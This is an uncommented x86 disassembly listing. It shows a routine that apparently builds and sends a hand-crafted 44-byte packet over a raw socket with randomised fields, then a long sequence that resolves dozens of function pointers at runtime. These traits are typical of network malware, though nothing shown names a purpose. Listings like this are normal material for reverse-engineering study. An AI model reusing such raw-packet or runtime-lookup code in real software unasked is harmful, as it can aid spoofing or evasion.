13144a71:	ff 75 fc             	pushl  -0x4(%ebp)
13144a74:	ff 15 68 36 15 13    	call   *0x13153668
13144a7a:	01 05 6c 33 15 13    	add    %eax,0x1315336c
13144a80:	ff 35 34 fc 14 13    	pushl  0x1314fc34
13144a86:	ff 15 fc 36 15 13    	call   *0x131536fc
13144a8c:	83 3d 98 31 15 13 00 	cmpl   $0x0,0x13153198
13144a93:	0f 85 56 ff ff ff    	jne    0x131449ef
13144a99:	56                   	push   %esi
13144a9a:	e8 73 09 00 00       	call   0x13145412
13144a9f:	59                   	pop    %ecx
13144aa0:	ff 75 fc             	pushl  -0x4(%ebp)
13144aa3:	ff 15 e4 36 15 13    	call   *0x131536e4
13144aa9:	5f                   	pop    %edi
13144aaa:	5e                   	pop    %esi
13144aab:	33 c0                	xor    %eax,%eax
13144aad:	5b                   	pop    %ebx
13144aae:	c9                   	leave  
13144aaf:	c2 04 00             	ret    $0x4
13144ab2:	55                   	push   %ebp
13144ab3:	8b ec                	mov    %esp,%ebp
13144ab5:	57                   	push   %edi
13144ab6:	33 ff                	xor    %edi,%edi
13144ab8:	39 3d 98 31 15 13    	cmp    %edi,0x13153198
13144abe:	74 05                	je     0x13144ac5
13144ac0:	6a 02                	push   $0x2
13144ac2:	58                   	pop    %eax
13144ac3:	eb 7f                	jmp    0x13144b44
13144ac5:	a1 44 45 17 13       	mov    0x13174544,%eax
13144aca:	56                   	push   %esi
13144acb:	ff 75 08             	pushl  0x8(%ebp)
13144ace:	a3 9c 32 15 13       	mov    %eax,0x1315329c
13144ad3:	c7 05 98 31 15 13 01 	movl   $0x1,0x13153198
13144ada:	00 00 00 
13144add:	68 00 d1 14 13       	push   $0x1314d100
13144ae2:	68 98 30 15 13       	push   $0x13153098
13144ae7:	ff 15 98 39 15 13    	call   *0x13153998
13144aed:	ff 75 0c             	pushl  0xc(%ebp)
13144af0:	68 9c 31 15 13       	push   $0x1315319c
13144af5:	ff 15 98 39 15 13    	call   *0x13153998
13144afb:	8b 45 10             	mov    0x10(%ebp),%eax
13144afe:	83 c4 14             	add    $0x14,%esp
13144b01:	33 f6                	xor    %esi,%esi
13144b03:	39 3d 38 fc 14 13    	cmp    %edi,0x1314fc38
13144b09:	a3 68 33 15 13       	mov    %eax,0x13153368
13144b0e:	89 3d 6c 33 15 13    	mov    %edi,0x1315336c
13144b14:	7e 2a                	jle    0x13144b40
13144b16:	53                   	push   %ebx
13144b17:	bb a0 32 15 13       	mov    $0x131532a0,%ebx
13144b1c:	8d 45 08             	lea    0x8(%ebp),%eax
13144b1f:	50                   	push   %eax
13144b20:	57                   	push   %edi
13144b21:	ff 75 14             	pushl  0x14(%ebp)
13144b24:	68 4c 48 14 13       	push   $0x1314484c
13144b29:	57                   	push   %edi
13144b2a:	57                   	push   %edi
13144b2b:	ff 15 30 37 15 13    	call   *0x13153730
13144b31:	89 03                	mov    %eax,(%ebx)
13144b33:	46                   	inc    %esi
13144b34:	83 c3 04             	add    $0x4,%ebx
13144b37:	3b 35 38 fc 14 13    	cmp    0x1314fc38,%esi
13144b3d:	7c dd                	jl     0x13144b1c
13144b3f:	5b                   	pop    %ebx
13144b40:	6a 01                	push   $0x1
13144b42:	58                   	pop    %eax
13144b43:	5e                   	pop    %esi
13144b44:	5f                   	pop    %edi
13144b45:	5d                   	pop    %ebp
13144b46:	c3                   	ret    
13144b47:	83 3d 98 31 15 13 00 	cmpl   $0x0,0x13153198
13144b4e:	75 04                	jne    0x13144b54
13144b50:	6a 02                	push   $0x2
13144b52:	58                   	pop    %eax
13144b53:	c3                   	ret    
13144b54:	83 25 98 31 15 13 00 	andl   $0x0,0x13153198
13144b5b:	6a 01                	push   $0x1
13144b5d:	58                   	pop    %eax
13144b5e:	c3                   	ret    
13144b5f:	b8 98 30 15 13       	mov    $0x13153098,%eax
13144b64:	c3                   	ret    
13144b65:	a1 98 31 15 13       	mov    0x13153198,%eax
13144b6a:	c3                   	ret    
13144b6b:	a1 6c 33 15 13       	mov    0x1315336c,%eax
13144b70:	c3                   	ret    
13144b71:	56                   	push   %esi
13144b72:	8b 74 24 08          	mov    0x8(%esp),%esi
13144b76:	57                   	push   %edi
13144b77:	6a 2c                	push   $0x2c
13144b79:	68 18 fd 14 13       	push   $0x1314fd18
13144b7e:	56                   	push   %esi
13144b7f:	e8 cc db ff ff       	call   0x13142750
13144b84:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
13144b88:	66 83 66 0a 00       	andw   $0x0,0xa(%esi)
13144b8d:	8b 44 24 20          	mov    0x20(%esp),%eax
13144b91:	83 c4 0c             	add    $0xc,%esp
13144b94:	85 ff                	test   %edi,%edi
13144b96:	89 46 10             	mov    %eax,0x10(%esi)
13144b99:	75 11                	jne    0x13144bac
13144b9b:	e8 45 db ff ff       	call   0x131426e5
13144ba0:	8b f8                	mov    %eax,%edi
13144ba2:	c1 e7 10             	shl    $0x10,%edi
13144ba5:	e8 3b db ff ff       	call   0x131426e5
13144baa:	0b f8                	or     %eax,%edi
13144bac:	89 7e 0c             	mov    %edi,0xc(%esi)
13144baf:	66 a1 74 33 15 13    	mov    0x13153374,%ax
13144bb5:	66 89 46 04          	mov    %ax,0x4(%esi)
13144bb9:	ff 05 74 33 15 13    	incl   0x13153374
13144bbf:	5f                   	pop    %edi
13144bc0:	5e                   	pop    %esi
13144bc1:	c3                   	ret    
13144bc2:	55                   	push   %ebp
13144bc3:	8b ec                	mov    %esp,%ebp
13144bc5:	83 ec 40             	sub    $0x40,%esp
13144bc8:	56                   	push   %esi
13144bc9:	57                   	push   %edi
13144bca:	68 ff 00 00 00       	push   $0xff
13144bcf:	6a 03                	push   $0x3
13144bd1:	6a 02                	push   $0x2
13144bd3:	ff 15 64 35 15 13    	call   *0x13153564
13144bd9:	8b f8                	mov    %eax,%edi
13144bdb:	83 ff ff             	cmp    $0xffffffff,%edi
13144bde:	74 1d                	je     0x13144bfd
13144be0:	8d 45 fc             	lea    -0x4(%ebp),%eax
13144be3:	6a 04                	push   $0x4
13144be5:	50                   	push   %eax
13144be6:	6a 02                	push   $0x2
13144be8:	6a 00                	push   $0x0
13144bea:	57                   	push   %edi
13144beb:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
13144bf2:	ff 15 84 36 15 13    	call   *0x13153684
13144bf8:	83 f8 ff             	cmp    $0xffffffff,%eax
13144bfb:	75 04                	jne    0x13144c01
13144bfd:	33 c0                	xor    %eax,%eax
13144bff:	eb 59                	jmp    0x13144c5a
13144c01:	8b 75 0c             	mov    0xc(%ebp),%esi
13144c04:	85 f6                	test   %esi,%esi
13144c06:	75 04                	jne    0x13144c0c
13144c08:	6a 01                	push   $0x1
13144c0a:	eb 4d                	jmp    0x13144c59
13144c0c:	6a 2c                	push   $0x2c
13144c0e:	8d 45 c0             	lea    -0x40(%ebp),%eax
13144c11:	6a 00                	push   $0x0
13144c13:	50                   	push   %eax
13144c14:	66 c7 45 ec 02 00    	movw   $0x2,-0x14(%ebp)
13144c1a:	89 75 f0             	mov    %esi,-0x10(%ebp)
13144c1d:	e8 00 da ff ff       	call   0x13142622
13144c22:	56                   	push   %esi
13144c23:	8d 45 c0             	lea    -0x40(%ebp),%eax
13144c26:	ff 75 08             	pushl  0x8(%ebp)
13144c29:	50                   	push   %eax
13144c2a:	e8 42 ff ff ff       	call   0x13144b71
13144c2f:	83 c4 18             	add    $0x18,%esp
13144c32:	8d 45 ec             	lea    -0x14(%ebp),%eax
13144c35:	6a 10                	push   $0x10
13144c37:	50                   	push   %eax
13144c38:	6a 00                	push   $0x0
13144c3a:	8d 45 c0             	lea    -0x40(%ebp),%eax
13144c3d:	6a 2c                	push   $0x2c
13144c3f:	50                   	push   %eax
13144c40:	57                   	push   %edi
13144c41:	ff 15 68 36 15 13    	call   *0x13153668
13144c47:	83 f8 ff             	cmp    $0xffffffff,%eax
13144c4a:	75 04                	jne    0x13144c50
13144c4c:	6a 02                	push   $0x2
13144c4e:	eb 09                	jmp    0x13144c59
13144c50:	57                   	push   %edi
13144c51:	ff 15 e4 36 15 13    	call   *0x131536e4
13144c57:	6a 03                	push   $0x3
13144c59:	58                   	pop    %eax
13144c5a:	5f                   	pop    %edi
13144c5b:	5e                   	pop    %esi
13144c5c:	c9                   	leave  
13144c5d:	c3                   	ret    
13144c5e:	83 ec 10             	sub    $0x10,%esp
13144c61:	53                   	push   %ebx
13144c62:	55                   	push   %ebp
13144c63:	56                   	push   %esi
13144c64:	8b 35 04 10 14 13    	mov    0x13141004,%esi
13144c6a:	57                   	push   %edi
13144c6b:	68 90 06 15 13       	push   $0x13150690
13144c70:	ff d6                	call   *%esi
13144c72:	68 80 06 15 13       	push   $0x13150680
13144c77:	8b d8                	mov    %eax,%ebx
13144c79:	ff d6                	call   *%esi
13144c7b:	68 74 06 15 13       	push   $0x13150674
13144c80:	8b f8                	mov    %eax,%edi
13144c82:	ff d6                	call   *%esi
13144c84:	68 64 06 15 13       	push   $0x13150664
13144c89:	89 44 24 18          	mov    %eax,0x18(%esp)
13144c8d:	ff d6                	call   *%esi
13144c8f:	68 58 06 15 13       	push   $0x13150658
13144c94:	8b e8                	mov    %eax,%ebp
13144c96:	ff d6                	call   *%esi
13144c98:	68 4c 06 15 13       	push   $0x1315064c
13144c9d:	89 44 24 14          	mov    %eax,0x14(%esp)
13144ca1:	ff d6                	call   *%esi
13144ca3:	68 40 06 15 13       	push   $0x13150640
13144ca8:	89 44 24 1c          	mov    %eax,0x1c(%esp)
13144cac:	ff d6                	call   *%esi
13144cae:	8b 35 00 10 14 13    	mov    0x13141000,%esi
13144cb4:	68 38 06 15 13       	push   $0x13150638
13144cb9:	53                   	push   %ebx
13144cba:	89 44 24 24          	mov    %eax,0x24(%esp)
13144cbe:	ff d6                	call   *%esi
13144cc0:	68 30 06 15 13       	push   $0x13150630
13144cc5:	53                   	push   %ebx
13144cc6:	a3 4c 37 15 13       	mov    %eax,0x1315374c
13144ccb:	ff d6                	call   *%esi
13144ccd:	68 28 06 15 13       	push   $0x13150628
13144cd2:	53                   	push   %ebx
13144cd3:	a3 68 37 15 13       	mov    %eax,0x13153768
13144cd8:	ff d6                	call   *%esi
13144cda:	68 20 06 15 13       	push   $0x13150620
13144cdf:	53                   	push   %ebx
13144ce0:	a3 68 36 15 13       	mov    %eax,0x13153668
13144ce5:	ff d6                	call   *%esi
13144ce7:	68 14 06 15 13       	push   $0x13150614
13144cec:	53                   	push   %ebx
13144ced:	a3 64 35 15 13       	mov    %eax,0x13153564
13144cf2:	ff d6                	call   *%esi
13144cf4:	68 08 06 15 13       	push   $0x13150608
13144cf9:	53                   	push   %ebx
13144cfa:	a3 84 36 15 13       	mov    %eax,0x13153684
13144cff:	ff d6                	call   *%esi
13144d01:	68 00 06 15 13       	push   $0x13150600
13144d06:	53                   	push   %ebx
13144d07:	a3 e4 36 15 13       	mov    %eax,0x131536e4
13144d0c:	ff d6                	call   *%esi
13144d0e:	68 f4 05 15 13       	push   $0x131505f4
13144d13:	53                   	push   %ebx
13144d14:	a3 34 37 15 13       	mov    %eax,0x13153734
13144d19:	ff d6                	call   *%esi
13144d1b:	68 e8 05 15 13       	push   $0x131505e8
13144d20:	53                   	push   %ebx
13144d21:	a3 50 37 15 13       	mov    %eax,0x13153750
13144d26:	ff d6                	call   *%esi
13144d28:	68 dc 05 15 13       	push   $0x131505dc
13144d2d:	57                   	push   %edi
13144d2e:	a3 74 37 15 13       	mov    %eax,0x13153774
13144d33:	ff d6                	call   *%esi
13144d35:	68 d0 05 15 13       	push   $0x131505d0
13144d3a:	57                   	push   %edi
13144d3b:	a3 ec 36 15 13       	mov    %eax,0x131536ec
13144d40:	ff d6                	call   *%esi
13144d42:	68 c4 05 15 13       	push   $0x131505c4
13144d47:	57                   	push   %edi
13144d48:	a3 b0 36 15 13       	mov    %eax,0x131536b0
13144d4d:	ff d6                	call   *%esi
13144d4f:	68 b4 05 15 13       	push   $0x131505b4
13144d54:	57                   	push   %edi
13144d55:	a3 80 33 15 13       	mov    %eax,0x13153380
13144d5a:	ff d6                	call   *%esi
13144d5c:	68 a8 05 15 13       	push   $0x131505a8
13144d61:	a3 70 36 15 13       	mov    %eax,0x13153670
13144d66:	ff 74 24 18          	pushl  0x18(%esp)
13144d6a:	ff d6                	call   *%esi
13144d6c:	68 98 05 15 13       	push   $0x13150598
13144d71:	57                   	push   %edi
13144d72:	a3 38 35 15 13       	mov    %eax,0x13153538
13144d77:	ff d6                	call   *%esi
13144d79:	68 8c 05 15 13       	push   $0x1315058c
13144d7e:	57                   	push   %edi
13144d7f:	a3 84 37 15 13       	mov    %eax,0x13153784
13144d84:	ff d6                	call   *%esi
13144d86:	68 80 05 15 13       	push   $0x13150580
13144d8b:	57                   	push   %edi
13144d8c:	a3 88 33 15 13       	mov    %eax,0x13153388
13144d91:	ff d6                	call   *%esi
13144d93:	68 70 05 15 13       	push   $0x13150570
13144d98:	57                   	push   %edi
13144d99:	a3 d4 33 15 13       	mov    %eax,0x131533d4
13144d9e:	ff d6                	call   *%esi
13144da0:	68 68 05 15 13       	push   $0x13150568
13144da5:	57                   	push   %edi
13144da6:	a3 f0 33 15 13       	mov    %eax,0x131533f0
13144dab:	ff d6                	call   *%esi
13144dad:	68 58 05 15 13       	push   $0x13150558
13144db2:	53                   	push   %ebx
13144db3:	a3 8c 33 15 13       	mov    %eax,0x1315338c
13144db8:	ff d6                	call   *%esi
13144dba:	68 4c 05 15 13       	push   $0x1315054c
13144dbf:	53                   	push   %ebx
13144dc0:	a3 d0 33 15 13       	mov    %eax,0x131533d0
13144dc5:	ff d6                	call   *%esi
13144dc7:	68 40 05 15 13       	push   $0x13150540
13144dcc:	53                   	push   %ebx
13144dcd:	a3 98 33 15 13       	mov    %eax,0x13153398
13144dd2:	ff d6                	call   *%esi
13144dd4:	68 38 05 15 13       	push   $0x13150538
13144dd9:	53                   	push   %ebx
13144dda:	a3 ac 39 15 13       	mov    %eax,0x131539ac
13144ddf:	ff d6                	call   *%esi
13144de1:	68 2c 05 15 13       	push   $0x1315052c
13144de6:	53                   	push   %ebx
13144de7:	a3 8c 37 15 13       	mov    %eax,0x1315378c
13144dec:	ff d6                	call   *%esi
13144dee:	68 1c 05 15 13       	push   $0x1315051c
13144df3:	57                   	push   %edi
13144df4:	a3 7c 36 15 13       	mov    %eax,0x1315367c
13144df9:	ff d6                	call   *%esi
13144dfb:	68 14 05 15 13       	push   $0x13150514
13144e00:	57                   	push   %edi
13144e01:	a3 28 34 15 13       	mov    %eax,0x13153428
13144e06:	ff d6                	call   *%esi
13144e08:	68 00 05 15 13       	push   $0x13150500
13144e0d:	57                   	push   %edi
13144e0e:	a3 fc 36 15 13       	mov    %eax,0x131536fc
13144e13:	ff d6                	call   *%esi
13144e15:	68 ec 04 15 13       	push   $0x131504ec
13144e1a:	57                   	push   %edi
13144e1b:	a3 40 35 15 13       	mov    %eax,0x13153540
13144e20:	ff d6                	call   *%esi
13144e22:	68 dc 04 15 13       	push   $0x131504dc
13144e27:	55                   	push   %ebp
13144e28:	a3 58 35 15 13       	mov    %eax,0x13153558
13144e2d:	ff d6                	call   *%esi
13144e2f:	68 c8 04 15 13       	push   $0x131504c8
13144e34:	55                   	push   %ebp
13144e35:	a3 ac 33 15 13       	mov    %eax,0x131533ac
13144e3a:	ff d6                	call   *%esi
13144e3c:	68 bc 04 15 13       	push   $0x131504bc
13144e41:	55                   	push   %ebp
13144e42:	a3 b0 33 15 13       	mov    %eax,0x131533b0
13144e47:	ff d6                	call   *%esi
13144e49:	68 ac 04 15 13       	push   $0x131504ac
13144e4e:	55                   	push   %ebp
13144e4f:	a3 cc 36 15 13       	mov    %eax,0x131536cc
13144e54:	ff d6                	call   *%esi
13144e56:	68 9c 04 15 13       	push   $0x1315049c
13144e5b:	57                   	push   %edi
13144e5c:	a3 44 35 15 13       	mov    %eax,0x13153544
13144e61:	ff d6                	call   *%esi
13144e63:	68 90 04 15 13       	push   $0x13150490
13144e68:	57                   	push   %edi
13144e69:	a3 30 37 15 13       	mov    %eax,0x13153730
13144e6e:	ff d6                	call   *%esi
13144e70:	68 84 04 15 13       	push   $0x13150484
13144e75:	57                   	push   %edi
13144e76:	a3 e0 33 15 13       	mov    %eax,0x131533e0
13144e7b:	ff d6                	call   *%esi
13144e7d:	68 78 04 15 13       	push   $0x13150478
13144e82:	57                   	push   %edi
13144e83:	a3 b4 33 15 13       	mov    %eax,0x131533b4
13144e88:	ff d6                	call   *%esi
13144e8a:	68 6c 04 15 13       	push   $0x1315046c
13144e8f:	57                   	push   %edi
13144e90:	a3 54 35 15 13       	mov    %eax,0x13153554
13144e95:	ff d6                	call   *%esi
13144e97:	68 5c 04 15 13       	push   $0x1315045c
13144e9c:	57                   	push   %edi
13144e9d:	a3 c8 36 15 13       	mov    %eax,0x131536c8
13144ea2:	ff d6                	call   *%esi
13144ea4:	68 50 04 15 13       	push   $0x13150450
13144ea9:	a3 d8 36 15 13       	mov    %eax,0x131536d8
13144eae:	ff 74 24 14          	pushl  0x14(%esp)
13144eb2:	ff d6                	call   *%esi
13144eb4:	68 40 04 15 13       	push   $0x13150440
13144eb9:	a3 24 34 15 13       	mov    %eax,0x13153424
13144ebe:	ff 74 24 14          	pushl  0x14(%esp)
13144ec2:	ff d6                	call   *%esi
13144ec4:	68 2c 04 15 13       	push   $0x1315042c
13144ec9:	a3 e4 33 15 13       	mov    %eax,0x131533e4
13144ece:	ff 74 24 14          	pushl  0x14(%esp)
13144ed2:	ff d6                	call   *%esi
13144ed4:	68 24 04 15 13       	push   $0x13150424
13144ed9:	a3 bc 36 15 13       	mov    %eax,0x131536bc
13144ede:	ff 74 24 14          	pushl  0x14(%esp)
13144ee2:	ff d6                	call   *%esi
13144ee4:	68 14 04 15 13       	push   $0x13150414
13144ee9:	a3 60 35 15 13       	mov    %eax,0x13153560
13144eee:	ff 74 24 14          	pushl  0x14(%esp)
13144ef2:	ff d6                	call   *%esi
13144ef4:	68 00 04 15 13       	push   $0x13150400
13144ef9:	a3 54 37 15 13       	mov    %eax,0x13153754
13144efe:	ff 74 24 14          	pushl  0x14(%esp)
13144f02:	ff d6                	call   *%esi
13144f04:	68 ec 03 15 13       	push   $0x131503ec
13144f09:	a3 58 37 15 13       	mov    %eax,0x13153758
13144f0e:	ff 74 24 14          	pushl  0x14(%esp)
13144f12:	ff d6                	call   *%esi
13144f14:	68 e0 03 15 13       	push   $0x131503e0
13144f19:	a3 c4 36 15 13       	mov    %eax,0x131536c4
13144f1e:	ff 74 24 14          	pushl  0x14(%esp)
13144f22:	ff d6                	call   *%esi
13144f24:	68 d0 03 15 13       	push   $0x131503d0
13144f29:	a3 80 37 15 13       	mov    %eax,0x13153780
13144f2e:	ff 74 24 14          	pushl  0x14(%esp)
13144f32:	ff d6                	call   *%esi
13144f34:	68 b4 03 15 13       	push   $0x131503b4
13144f39:	57                   	push   %edi
13144f3a:	a3 78 37 15 13       	mov    %eax,0x13153778
13144f3f:	ff d6                	call   *%esi
13144f41:	68 a4 03 15 13       	push   $0x131503a4
13144f46:	57                   	push   %edi
13144f47:	a3 9c 39 15 13       	mov    %eax,0x1315399c
13144f4c:	ff d6                	call   *%esi
13144f4e:	68 94 03 15 13       	push   $0x13150394
13144f53:	57                   	push   %edi
13144f54:	a3 78 36 15 13       	mov    %eax,0x13153678
13144f59:	ff d6                	call   *%esi
13144f5b:	68 84 03 15 13       	push   $0x13150384
13144f60:	57                   	push   %edi
13144f61:	a3 e0 36 15 13       	mov    %eax,0x131536e0
13144f66:	ff d6                	call   *%esi
13144f68:	68 74 03 15 13       	push   $0x13150374
13144f6d:	57                   	push   %edi
13144f6e:	a3 c8 33 15 13       	mov    %eax,0x131533c8
13144f73:	ff d6                	call   *%esi
13144f75:	68 5c 03 15 13       	push   $0x1315035c
13144f7a:	57                   	push   %edi
13144f7b:	a3 9c 33 15 13       	mov    %eax,0x1315339c
13144f80:	ff d6                	call   *%esi
13144f82:	68 54 03 15 13       	push   $0x13150354
13144f87:	53                   	push   %ebx
13144f88:	a3 50 35 15 13       	mov    %eax,0x13153550
13144f8d:	ff d6                	call   *%esi
13144f8f:	a3 5c 37 15 13       	mov    %eax,0x1315375c
13144f94:	68 4c 03 15 13       	push   $0x1315034c
13144f99:	53                   	push   %ebx
13144f9a:	ff d6                	call   *%esi
13144f9c:	68 44 03 15 13       	push   $0x13150344
13144fa1:	53                   	push   %ebx
13144fa2:	a3 00 34 15 13       	mov    %eax,0x13153400
13144fa7:	ff d6                	call   *%esi
13144fa9:	68 34 03 15 13       	push   $0x13150334
13144fae:	57                   	push   %edi
13144faf:	a3 3c 37 15 13       	mov    %eax,0x1315373c
13144fb4:	ff d6                	call   *%esi
13144fb6:	68 28 03 15 13       	push   $0x13150328
13144fbb:	57                   	push   %edi
13144fbc:	a3 2c 37 15 13       	mov    %eax,0x1315372c
13144fc1:	ff d6                	call   *%esi
13144fc3:	68 14 03 15 13       	push   $0x13150314
13144fc8:	57                   	push   %edi
13144fc9:	a3 a8 36 15 13       	mov    %eax,0x131536a8
13144fce:	ff d6                	call   *%esi
13144fd0:	68 00 03 15 13       	push   $0x13150300
13144fd5:	a3 78 33 15 13       	mov    %eax,0x13153378
13144fda:	ff 74 24 18          	pushl  0x18(%esp)
13144fde:	ff d6                	call   *%esi
13144fe0:	68 ec 02 15 13       	push   $0x131502ec
13144fe5:	57                   	push   %edi
13144fe6:	a3 a8 33 15 13       	mov    %eax,0x131533a8
13144feb:	ff d6                	call   *%esi
13144fed:	68 e0 02 15 13       	push   $0x131502e0
13144ff2:	57                   	push   %edi
13144ff3:	a3 f8 33 15 13       	mov    %eax,0x131533f8
13144ff8:	ff d6                	call   *%esi
13144ffa:	68 d0 02 15 13       	push   $0x131502d0
13144fff:	55                   	push   %ebp
13145000:	a3 a8 39 15 13       	mov    %eax,0x131539a8
13145005:	ff d6                	call   *%esi
13145007:	68 c8 02 15 13       	push   $0x131502c8
1314500c:	53                   	push   %ebx
1314500d:	a3 90 33 15 13       	mov    %eax,0x13153390
13145012:	ff d6                	call   *%esi
13145014:	68 bc 02 15 13       	push   $0x131502bc
13145019:	53                   	push   %ebx
1314501a:	a3 fc 33 15 13       	mov    %eax,0x131533fc
1314501f:	ff d6                	call   *%esi
13145021:	68 ac 02 15 13       	push   $0x131502ac
13145026:	53                   	push   %ebx
13145027:	a3 14 34 15 13       	mov    %eax,0x13153414
1314502c:	ff d6                	call   *%esi
1314502e:	68 94 02 15 13       	push   $0x13150294
13145033:	57                   	push   %edi
13145034:	a3 ac 36 15 13       	mov    %eax,0x131536ac
13145039:	ff d6                	call   *%esi
1314503b:	68 7c 02 15 13       	push   $0x1315027c
13145040:	57                   	push   %edi
13145041:	a3 04 37 15 13       	mov    %eax,0x13153704
13145046:	ff d6                	call   *%esi
13145048:	68 6c 02 15 13       	push   $0x1315026c
1314504d:	57                   	push   %edi
1314504e:	a3 40 37 15 13       	mov    %eax,0x13153740
13145053:	ff d6                	call   *%esi
13145055:	68 5c 02 15 13       	push   $0x1315025c
1314505a:	57                   	push   %edi
1314505b:	a3 b8 33 15 13       	mov    %eax,0x131533b8
13145060:	ff d6                	call   *%esi
13145062:	68 54 02 15 13       	push   $0x13150254
13145067:	57                   	push   %edi
13145068:	a3 0c 37 15 13       	mov    %eax,0x1315370c
1314506d:	ff d6                	call   *%esi
1314506f:	68 40 02 15 13       	push   $0x13150240
13145074:	57                   	push   %edi
13145075:	a3 f0 36 15 13       	mov    %eax,0x131536f0
1314507a:	ff d6                	call   *%esi
1314507c:	68 2c 02 15 13       	push   $0x1315022c
13145081:	57                   	push   %edi
13145082:	a3 44 37 15 13       	mov    %eax,0x13153744
13145087:	ff d6                	call   *%esi
13145089:	68 1c 02 15 13       	push   $0x1315021c
1314508e:	57                   	push   %edi
1314508f:	a3 f4 36 15 13       	mov    %eax,0x131536f4
13145094:	ff d6                	call   *%esi
13145096:	a3 84 33 15 13       	mov    %eax,0x13153384
1314509b:	68 0c 02 15 13       	push   $0x1315020c
131450a0:	57                   	push   %edi
131450a1:	ff d6                	call   *%esi
131450a3:	68 fc 01 15 13       	push   $0x131501fc
131450a8:	57                   	push   %edi
131450a9:	a3 4c 35 15 13       	mov    %eax,0x1315354c
131450ae:	ff d6                	call   *%esi
131450b0:	68 e8 01 15 13       	push   $0x131501e8
131450b5:	57                   	push   %edi
131450b6:	a3 6c 36 15 13       	mov    %eax,0x1315366c
131450bb:	ff d6                	call   *%esi
131450bd:	68 dc 01 15 13       	push   $0x131501dc
131450c2:	57                   	push   %edi
131450c3:	a3 28 37 15 13       	mov    %eax,0x13153728
131450c8:	ff d6                	call   *%esi
131450ca:	68 c8 01 15 13       	push   $0x131501c8
131450cf:	57                   	push   %edi
131450d0:	a3 88 37 15 13       	mov    %eax,0x13153788
131450d5:	ff d6                	call   *%esi
131450d7:	68 b4 01 15 13       	push   $0x131501b4
131450dc:	57                   	push   %edi
131450dd:	a3 0c 34 15 13       	mov    %eax,0x1315340c
131450e2:	ff d6                	call   *%esi
131450e4:	68 a8 01 15 13       	push   $0x131501a8
131450e9:	57                   	push   %edi
131450ea:	a3 7c 37 15 13       	mov    %eax,0x1315377c
131450ef:	ff d6                	call   *%esi
131450f1:	68 98 01 15 13       	push   $0x13150198
131450f6:	57                   	push   %edi
131450f7:	a3 cc 33 15 13       	mov    %eax,0x131533cc
131450fc:	ff d6                	call   *%esi
131450fe:	68 84 01 15 13       	push   $0x13150184
13145103:	57                   	push   %edi
13145104:	a3 e8 36 15 13       	mov    %eax,0x131536e8
13145109:	ff d6                	call   *%esi
1314510b:	68 70 01 15 13       	push   $0x13150170
13145110:	57                   	push   %edi
13145111:	a3 bc 33 15 13       	mov    %eax,0x131533bc
13145116:	ff d6                	call   *%esi
13145118:	68 5c 01 15 13       	push   $0x1315015c
1314511d:	57                   	push   %edi
1314511e:	a3 7c 33 15 13       	mov    %eax,0x1315337c
13145123:	ff d6                	call   *%esi
13145125:	68 4c 01 15 13       	push   $0x1315014c
1314512a:	57                   	push   %edi
1314512b:	a3 dc 36 15 13       	mov    %eax,0x131536dc
13145130:	ff d6                	call   *%esi
13145132:	68 38 01 15 13       	push   $0x13150138
13145137:	57                   	push   %edi
13145138:	a3 b8 36 15 13       	mov    %eax,0x131536b8
1314513d:	ff d6                	call   *%esi
1314513f:	68 28 01 15 13       	push   $0x13150128
13145144:	53                   	push   %ebx
13145145:	a3 34 35 15 13       	mov    %eax,0x13153534
1314514a:	ff d6                	call   *%esi
1314514c:	68 18 01 15 13       	push   $0x13150118
13145151:	57                   	push   %edi
13145152:	a3 f8 36 15 13       	mov    %eax,0x131536f8
13145157:	ff d6                	call   *%esi
13145159:	68 08 01 15 13       	push   $0x13150108
1314515e:	57                   	push   %edi
1314515f:	a3 48 35 15 13       	mov    %eax,0x13153548
13145164:	ff d6                	call   *%esi
13145166:	68 f8 00 15 13       	push   $0x131500f8
1314516b:	57                   	push   %edi
1314516c:	a3 a0 33 15 13       	mov    %eax,0x131533a0
13145171:	ff d6                	call   *%esi
13145173:	68 ec 00 15 13       	push   $0x131500ec
13145178:	57                   	push   %edi
13145179:	a3 74 36 15 13       	mov    %eax,0x13153674
1314517e:	ff d6                	call   *%esi
13145180:	68 e0 00 15 13       	push   $0x131500e0
13145185:	57                   	push   %edi
13145186:	a3 b4 36 15 13       	mov    %eax,0x131536b4
1314518b:	ff d6                	call   *%esi
1314518d:	68 cc 00 15 13       	push   $0x131500cc
13145192:	57                   	push   %edi
13145193:	a3 90 39 15 13       	mov    %eax,0x13153990
13145198:	ff d6                	call   *%esi
1314519a:	68 bc 00 15 13       	push   $0x131500bc
1314519f:	a3 18 37 15 13       	mov    %eax,0x13153718
131451a4:	57                   	push   %edi
131451a5:	ff d6                	call   *%esi
131451a7:	68 b0 00 15 13       	push   $0x131500b0
131451ac:	57                   	push   %edi
131451ad:	a3 30 35 15 13       	mov    %eax,0x13153530
131451b2:	ff d6                	call   *%esi
131451b4:	68 a0 00 15 13       	push   $0x131500a0
131451b9:	57                   	push   %edi
131451ba:	a3 10 34 15 13       	mov    %eax,0x13153410
131451bf:	ff d6                	call   *%esi
131451c1:	68 90 00 15 13       	push   $0x13150090
131451c6:	57                   	push   %edi
131451c7:	a3 5c 35 15 13       	mov    %eax,0x1315355c
131451cc:	ff d6                	call   *%esi
131451ce:	68 80 00 15 13       	push   $0x13150080
131451d3:	57                   	push   %edi
131451d4:	a3 64 37 15 13       	mov    %eax,0x13153764
131451d9:	ff d6                	call   *%esi
131451db:	68 6c 00 15 13       	push   $0x1315006c
131451e0:	55                   	push   %ebp
131451e1:	a3 d4 36 15 13       	mov    %eax,0x131536d4
131451e6:	ff d6                	call   *%esi
131451e8:	68 5c 00 15 13       	push   $0x1315005c
131451ed:	57                   	push   %edi
131451ee:	a3 48 37 15 13       	mov    %eax,0x13153748
131451f3:	ff d6                	call   *%esi
131451f5:	8b 5c 24 18          	mov    0x18(%esp),%ebx
131451f9:	68 40 00 15 13       	push   $0x13150040
131451fe:	53                   	push   %ebx
131451ff:	a3 1c 34 15 13       	mov    %eax,0x1315341c
13145204:	ff d6                	call   *%esi
13145206:	68 24 00 15 13       	push   $0x13150024
1314520b:	53                   	push   %ebx
1314520c:	a3 60 37 15 13       	mov    %eax,0x13153760
13145211:	ff d6                	call   *%esi
13145213:	68 08 00 15 13       	push   $0x13150008
13145218:	53                   	push   %ebx
13145219:	a3 00 37 15 13       	mov    %eax,0x13153700
1314521e:	ff d6                	call   *%esi
13145220:	68 f8 ff 14 13       	push   $0x1314fff8
13145225:	53                   	push   %ebx
13145226:	a3 a4 39 15 13       	mov    %eax,0x131539a4
1314522b:	ff d6                	call   *%esi
